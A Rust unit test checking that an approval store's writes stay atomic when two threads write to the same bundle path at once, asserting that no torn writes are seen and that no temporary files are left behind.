    fn store_approval_write_is_atomic_under_concurrent_writers() {
        let tmp = std::env::temp_dir().join(format!(
            "varda-approval-atomic-test-{:p}",
            &tmp_marker() as *const _
        ));
        let store = std::sync::Arc::new(ApprovalStore::open_at(tmp.clone()).expect("open store"));
        let bundle_path = Path::new("/some/shared/bundle-atomic.toml");

        let long_content = "A".repeat(200_000);
        let short_content = "B".repeat(50_000);

        let writer_a = {
            let store = store.clone();
            let content = long_content.clone();
            std::thread::spawn(move || {
                for _ in 0..25 {
                    store.store_approval(bundle_path, &content).unwrap();
                }
            })
        };
        let writer_b = {
            let store = store.clone();
            let content = short_content.clone();
            std::thread::spawn(move || {
                for _ in 0..25 {
                    store.store_approval(bundle_path, &content).unwrap();
                }
            })
        };

        for _ in 0..500 {
            if let Some(content) = store.load_approved_content(bundle_path).unwrap() {
                assert!(
                    content == long_content || content == short_content,
                    "observed a torn/partial write of length {}",
                    content.len()
                );
            }
        }

        writer_a.join().unwrap();
        writer_b.join().unwrap();

        // No stray temp files should survive the renames.
        let leftovers: Vec<_> = fs::read_dir(&tmp)
            .unwrap()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_name().to_string_lossy().contains(".tmp."))
            .collect();
        assert!(leftovers.is_empty(), "leftover temp files: {leftovers:?}");

        let _ = fs::remove_dir_all(&tmp);
    }
}
